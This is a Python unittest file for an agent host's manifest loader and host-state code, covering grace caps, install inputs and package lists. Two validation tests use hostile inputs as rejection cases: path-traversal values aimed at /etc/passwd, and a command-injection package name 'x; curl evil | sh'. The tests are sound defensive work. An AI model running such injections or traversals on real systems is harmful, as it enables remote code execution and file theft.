"""The agent's manifest (vesta_host.manifest) and the host state
(vesta_host.host_state) — by value, no process started.

Before, the stop-grace cap and the empty-slot rules were reachable only by
starting the slot as a real process and sleeping."""
from __future__ import annotations

import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
HOST = HERE.parent / "rootfs" / "opt" / "vesta" / "host"
sys.path.insert(0, str(HOST))

from vesta_host import manifest  # noqa: E402
from vesta_host.host_state import HostState  # noqa: E402


class Manifests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp())

    def write(self, text: str) -> Path:
        p = self.dir / "vesta-agent.yaml"
        p.write_text(text)
        return p

    def test_a_good_manifest(self):
        m, problem = manifest.load(self.write(
            "name: helper\nversion: '1.2'\nruntime: python\nstart: python -m helper\ninstall: pip install .\nstop_grace_seconds: 5\n"))
        self.assertIsNone(problem)
        self.assertEqual((m.label, m.start, m.install, m.stop_grace), ("helper 1.2", "python -m helper", "pip install .", 5))

    def test_the_grace_is_capped_to_fit_the_apps_30_s(self):
        m, _ = manifest.load(self.write("start: run\nstop_grace_seconds: 120\n"))
        self.assertEqual(m.stop_grace, manifest.MAX_GRACE)
        self.assertTrue(any("capped to 22" in w for w in m.warnings))

    def test_no_grace_is_the_default_and_junk_is_too(self):
        self.assertEqual(manifest.load(self.write("start: run\n"))[0].stop_grace, manifest.DEFAULT_GRACE)
        m, _ = manifest.load(self.write("start: run\nstop_grace_seconds: soon\n"))
        self.assertEqual(m.stop_grace, manifest.DEFAULT_GRACE)
        self.assertTrue(m.warnings)

    def test_no_start_is_a_reason_not_a_crash(self):
        m, problem = manifest.load(self.write("name: x\n"))
        self.assertIsNone(m)
        self.assertIn("no `start` command", problem)

    def test_broken_yaml_is_a_reason(self):
        m, problem = manifest.load(self.write("start: [unclosed\n"))
        self.assertIsNone(m)
        self.assertTrue(problem)

    def test_identity(self):
        self.assertEqual(manifest.identity(self.dir / "missing.yaml"), "none installed")
        self.assertEqual(manifest.identity(self.write("name: helper\nversion: 2\nruntime: node\nstart: x\n")), "helper 2 (node)")

    def build_inputs(self, text: str, files: dict[str, str]) -> tuple[subprocess.CompletedProcess, Path]:
        src = self.dir / "src"
        for rel, body in files.items():
            (src / rel).parent.mkdir(parents=True, exist_ok=True)
            (src / rel).write_text(body)
        dst = self.dir / "inputs"
        r = subprocess.run([sys.executable, "-m", "vesta_host.manifest", "build-inputs", str(self.write(text)),
                            str(src), str(dst)], capture_output=True, text=True, env={"PYTHONPATH": str(HOST)})
        return r, dst

    def test_the_install_inputs_are_only_the_install_files(self):
        # what keeps an update small: the libraries' layer depends on these alone
        r, dst = self.build_inputs("start: x\ninstall: pip install -r requirements.txt\ninstall_files: [requirements.txt]\n"
                                   "system_packages: [fonts-dejavu-core]\n",
                                   {"requirements.txt": "aiohttp==1\n", "agent/code.py": "x = 1\n", "tests/t.py": ""})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(sorted(p.name for p in (dst / "install").iterdir()), ["install.sh", "requirements.txt"])
        self.assertEqual((dst / "install" / "install.sh").read_text(), "pip install -r requirements.txt\n")
        self.assertEqual((dst / "packages.txt").read_text().strip(), "fonts-dejavu-core")
        self.assertIn("vesta_host.manifest build-inputs", (HERE.parent / "Dockerfile").read_text())

    def test_without_install_files_the_whole_source_is_the_input(self):
        r, dst = self.build_inputs("start: x\ninstall: make\n", {"Makefile": "all:\n", "tests/t.py": ""})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(sorted(p.name for p in (dst / "install").iterdir()), ["Makefile", "install.sh"])
        self.assertEqual((dst / "packages.txt").read_text().strip(), "")

    def test_install_files_outside_the_agent_folder_are_refused(self):
        for bad in ("[../../etc/passwd]", "[/etc/passwd]", "[a/../../b]", "[-rf]", "requirements.txt"):
            m, problem = manifest.load(self.write(f"start: x\ninstall_files: {bad}\n"))
            self.assertIsNone(m, bad)
            self.assertIn("install_files", problem)
            r, _ = self.build_inputs(f"start: x\ninstall_files: {bad}\n", {})
            self.assertEqual(r.returncode, 1, bad)

    def test_system_packages(self):
        m, problem = manifest.load(self.write(
            "start: x\nsystem_packages: [chromium-headless-shell, fonts-dejavu-core]\n"))
        self.assertIsNone(problem)
        self.assertEqual(m.system_packages, ["chromium-headless-shell", "fonts-dejavu-core"])
        self.assertEqual(manifest.load(self.write("start: x\n"))[0].system_packages, [])

    def test_a_package_list_that_is_not_package_names_is_refused(self):
        # The list reaches `apt-get install` unquoted in the image build.
        for bad in ("[\"x; curl evil | sh\"]", "[\"--allow-unauthenticated\"]", "[\"Upper\"]", "a-string"):
            m, problem = manifest.load(self.write(f"start: x\nsystem_packages: {bad}\n"))
            self.assertIsNone(m, bad)
            self.assertIn("system_packages", problem)
            r, dst = self.build_inputs(f"start: x\nsystem_packages: {bad}\n", {})
            self.assertEqual(r.returncode, 1, bad)
            self.assertFalse((dst / "packages.txt").exists(), bad)

    def test_the_real_agent_manifest_loads(self):
        m, problem = manifest.load(HERE.parent / "agent-src" / "vesta-agent.yaml")
        self.assertIsNone(problem)
        self.assertEqual((m.name, m.start), ("vesta-agent", "python -m vesta_agent"))
        self.assertEqual(m.system_packages, [])                      # no PDF, no headless browser (0.9.2)
        self.assertEqual(m.install_files, ["requirements.txt"])
        self.assertEqual(m.ui, "python -m vesta_agent.ui")


class HostStates(unittest.TestCase):
    def test_round_trip(self):
        p = Path(tempfile.mkdtemp()) / "host.json"
        h = HostState(agent_mode="agent", stub_heartbeat=True, sidecar_reason="off", host_version="0.8.0")
        h.write(p)
        self.assertEqual(HostState.read(p), h)

    def test_missing_keys_are_defaulted_and_junk_ignored(self):
        h = HostState.of({"agent_mode": None, "sidecar_reason": 3, "extra": 1})
        self.assertEqual(h, HostState())

    def test_a_missing_file_raises(self):
        with self.assertRaises(OSError):
            HostState.read(Path(tempfile.mkdtemp()) / "none.json")


if __name__ == "__main__":
    unittest.main(verbosity=2)
